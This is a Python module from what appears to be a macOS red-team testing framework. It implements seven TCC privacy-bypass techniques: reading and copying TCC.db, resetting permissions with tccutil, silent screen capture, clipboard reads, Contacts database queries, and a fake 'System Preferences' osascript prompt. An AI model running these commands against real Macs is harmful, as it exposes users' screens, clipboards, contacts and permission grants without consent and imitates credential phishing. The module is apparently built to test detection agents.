"""TCC Hunter — Transparency, Consent, and Control bypass techniques.

TCC is macOS's privacy framework. It controls access to camera, microphone,
screen recording, full disk access, contacts, calendars, and more.
Bypassing TCC without user consent is one of Apple's highest-priority
bug bounty categories.

Blue team mirror: InfostealerGuard, UnifiedLog (TCCProbe), SecurityMonitor
"""

from lib.technique import AttackTechnique, TechniqueResult, TechniqueStatus


class TCCDatabaseRead(AttackTechnique):
    """Attempt to read TCC.db directly — the crown jewel of TCC bypasses."""

    name = "tcc_db_read"
    description = "Direct read of TCC.db to extract permission grants"
    mitre_id = "T1548.006"
    mitre_tactic = "privilege_escalation"
    blue_team_probe = "TCCProbe"
    blue_team_agent = "UnifiedLogAgent"
    bounty_eligible = True
    bounty_category = "Unauthorized access to sensitive data"
    bounty_estimate = "$50,000-$100,000"
    risk_level = "safe"  # Read-only, no modification

    def execute(self, target: str, **kwargs) -> TechniqueResult:
        # TCC.db locations on macOS
        tcc_paths = [
            "~/Library/Application Support/com.apple.TCC/TCC.db",
            "/Library/Application Support/com.apple.TCC/TCC.db",
        ]

        results = {}
        for path in tcc_paths:
            cmd = f'sqlite3 {path} "SELECT service,client,allowed FROM access LIMIT 10" 2>&1'
            r = self._run_on_target(target, cmd, **kwargs)
            results[path] = {
                "stdout": r.stdout[:500] if r.stdout else "",
                "stderr": r.stderr[:500] if r.stderr else "",
                "returncode": r.returncode,
                "accessible": r.returncode == 0 and "error" not in r.stderr.lower(),
            }

        any_readable = any(v["accessible"] for v in results.values())

        return TechniqueResult(
            technique_id=self.name,
            technique_name=self.description,
            mitre_id=self.mitre_id,
            status=TechniqueStatus.SUCCESS if any_readable else TechniqueStatus.BLOCKED,
            details={"tcc_paths": results, "tcc_bypass": any_readable},
        )


class TCCDatabaseCopy(AttackTechnique):
    """Copy TCC.db to a temp location and read it there — common bypass."""

    name = "tcc_db_copy_read"
    description = "Copy TCC.db to temp and read outside SIP protection"
    mitre_id = "T1548.006"
    mitre_tactic = "defense_evasion"
    blue_team_probe = "TCCProbe"
    blue_team_agent = "UnifiedLogAgent"
    bounty_eligible = True
    bounty_category = "Unauthorized access to sensitive data"
    bounty_estimate = "$50,000-$100,000"
    risk_level = "safe"

    def execute(self, target: str, **kwargs) -> TechniqueResult:
        src = "~/Library/Application\\ Support/com.apple.TCC/TCC.db"
        dst = "/tmp/.amoskys_tcc_test.db"

        copy_cmd = f"cp {src} {dst} 2>&1"
        r_copy = self._run_on_target(target, copy_cmd, **kwargs)

        read_cmd = f'sqlite3 {dst} "SELECT service,client,allowed FROM access LIMIT 5" 2>&1'
        r_read = self._run_on_target(target, read_cmd, **kwargs)

        # Cleanup
        self._run_on_target(target, f"rm -f {dst}", **kwargs)

        copied = r_copy.returncode == 0
        readable = r_read.returncode == 0 and r_read.stdout.strip()

        return TechniqueResult(
            technique_id=self.name,
            technique_name=self.description,
            mitre_id=self.mitre_id,
            status=TechniqueStatus.SUCCESS if (copied and readable) else TechniqueStatus.BLOCKED,
            details={
                "copy_result": r_copy.stderr[:200] or "success",
                "read_result": r_read.stdout[:300] if readable else r_read.stderr[:200],
                "bypass_worked": copied and readable,
            },
            cleanup_done=True,
        )


class TCCPermissionReset(AttackTechnique):
    """Reset TCC permissions for an app — forces re-consent."""

    name = "tcc_permission_reset"
    description = "Reset TCC permissions via tccutil to force re-consent dialogs"
    mitre_id = "T1548.006"
    mitre_tactic = "defense_evasion"
    blue_team_probe = "TCCProbe"
    blue_team_agent = "UnifiedLogAgent"
    bounty_eligible = True
    bounty_category = "Unauthorized access to sensitive data"
    bounty_estimate = "$25,000-$50,000"
    risk_level = "moderate"  # Modifies TCC state

    def execute(self, target: str, **kwargs) -> TechniqueResult:
        # Test with a harmless app — Terminal
        cmd = "tccutil reset All com.apple.Terminal 2>&1"
        r = self._run_on_target(target, cmd, **kwargs)

        return TechniqueResult(
            technique_id=self.name,
            technique_name=self.description,
            mitre_id=self.mitre_id,
            status=TechniqueStatus.SUCCESS if r.returncode == 0 else TechniqueStatus.BLOCKED,
            details={"output": r.stdout[:300], "error": r.stderr[:300]},
        )


class TCCScreenCapture(AttackTechnique):
    """Attempt screen capture without TCC consent."""

    name = "tcc_screencapture"
    description = "Attempt screencapture without screen recording TCC grant"
    mitre_id = "T1113"
    mitre_tactic = "collection"
    blue_team_probe = "ScreenCaptureProbe"
    blue_team_agent = "InfostealerGuardAgent"
    bounty_eligible = True
    bounty_category = "Unauthorized access to sensitive data"
    bounty_estimate = "$25,000-$50,000"
    risk_level = "safe"

    def execute(self, target: str, **kwargs) -> TechniqueResult:
        dst = "/tmp/.amoskys_screen_test.png"
        cmd = f"screencapture -x {dst} 2>&1"
        r = self._run_on_target(target, cmd, **kwargs)

        # Check if file was actually created with content
        check = self._run_on_target(target, f"ls -la {dst} 2>&1", **kwargs)
        has_content = check.returncode == 0 and "No such file" not in check.stdout

        # Cleanup
        self._run_on_target(target, f"rm -f {dst}", **kwargs)

        return TechniqueResult(
            technique_id=self.name,
            technique_name=self.description,
            mitre_id=self.mitre_id,
            status=TechniqueStatus.SUCCESS if has_content else TechniqueStatus.BLOCKED,
            details={
                "capture_output": r.stdout[:200],
                "file_created": has_content,
                "file_info": check.stdout[:200],
            },
            cleanup_done=True,
        )


class TCCClipboardRead(AttackTechnique):
    """Read clipboard contents — tests pasteboard TCC enforcement."""

    name = "tcc_clipboard_read"
    description = "Read pasteboard contents to test clipboard TCC enforcement"
    mitre_id = "T1115"
    mitre_tactic = "collection"
    blue_team_probe = "ClipboardProbe"
    blue_team_agent = "InfostealerGuardAgent"
    bounty_eligible = True
    bounty_category = "Unauthorized access to sensitive data"
    bounty_estimate = "$25,000-$50,000"
    risk_level = "safe"

    def execute(self, target: str, **kwargs) -> TechniqueResult:
        cmd = "pbpaste 2>&1"
        r = self._run_on_target(target, cmd, **kwargs)

        has_content = r.returncode == 0 and len(r.stdout.strip()) > 0

        return TechniqueResult(
            technique_id=self.name,
            technique_name=self.description,
            mitre_id=self.mitre_id,
            status=TechniqueStatus.SUCCESS if has_content else TechniqueStatus.BLOCKED,
            details={
                "clipboard_accessible": has_content,
                "content_length": len(r.stdout) if has_content else 0,
                # Don't log actual clipboard contents — could be sensitive
                "content_preview": "(redacted)" if has_content else "empty",
            },
        )


class TCCContactsRead(AttackTechnique):
    """Attempt to read Contacts database without TCC grant."""

    name = "tcc_contacts_read"
    description = "Read AddressBook database to test Contacts TCC enforcement"
    mitre_id = "T1005"
    mitre_tactic = "collection"
    blue_team_probe = "TCCProbe"
    blue_team_agent = "UnifiedLogAgent"
    bounty_eligible = True
    bounty_category = "Unauthorized access to sensitive data"
    bounty_estimate = "$50,000-$100,000"
    risk_level = "safe"  # Read-only

    def execute(self, target: str, **kwargs) -> TechniqueResult:
        ab_path = "~/Library/Application\\ Support/AddressBook/AddressBook-v22.abcddb"
        cmd = f'sqlite3 {ab_path} "SELECT COUNT(*) FROM ZABCDRECORD" 2>&1'
        r = self._run_on_target(target, cmd, **kwargs)

        accessible = r.returncode == 0 and r.stderr.strip() == ""

        return TechniqueResult(
            technique_id=self.name,
            technique_name=self.description,
            mitre_id=self.mitre_id,
            status=TechniqueStatus.SUCCESS if accessible else TechniqueStatus.BLOCKED,
            details={
                "contacts_accessible": accessible,
                "output": r.stdout[:200] if accessible else r.stderr[:200],
            },
        )


class TCCFakeDialog(AttackTechnique):
    """Spawn a fake password prompt via osascript — social engineering TCC."""

    name = "tcc_fake_dialog"
    description = "Spawn osascript password dialog to harvest credentials"
    mitre_id = "T1056.002"
    mitre_tactic = "credential_access"
    blue_team_probe = "FakeDialogProbe"
    blue_team_agent = "InfostealerGuardAgent"
    bounty_eligible = False  # Social engineering, not a TCC bypass
    risk_level = "moderate"  # Spawns visible dialog

    def execute(self, target: str, **kwargs) -> TechniqueResult:
        # Test if osascript can spawn dialogs without TCC
        cmd = (
            'osascript -e \'display dialog "AMOSKYS Security Test - '
            'This is a simulated phishing dialog. Click Cancel." '
            'with title "System Preferences" buttons {"Cancel"} '
            'default button "Cancel" giving up after 3\' 2>&1'
        )
        r = self._run_on_target(target, cmd, **kwargs)

        # osascript returns 0 if dialog displayed (even if cancelled/timed out)
        dialog_shown = r.returncode == 0 or "gave up" in r.stdout.lower()

        return TechniqueResult(
            technique_id=self.name,
            technique_name=self.description,
            mitre_id=self.mitre_id,
            status=TechniqueStatus.SUCCESS if dialog_shown else TechniqueStatus.BLOCKED,
            details={
                "dialog_spawned": dialog_shown,
                "output": r.stdout[:200],
                "error": r.stderr[:200],
            },
        )


# --- Agent Registry ---

ALL_TECHNIQUES = [
    TCCDatabaseRead(),
    TCCDatabaseCopy(),
    TCCPermissionReset(),
    TCCScreenCapture(),
    TCCClipboardRead(),
    TCCContactsRead(),
    TCCFakeDialog(),
]

AGENT_NAME = "tcc_hunter"
AGENT_DESCRIPTION = "TCC (Transparency, Consent, Control) bypass hunter"
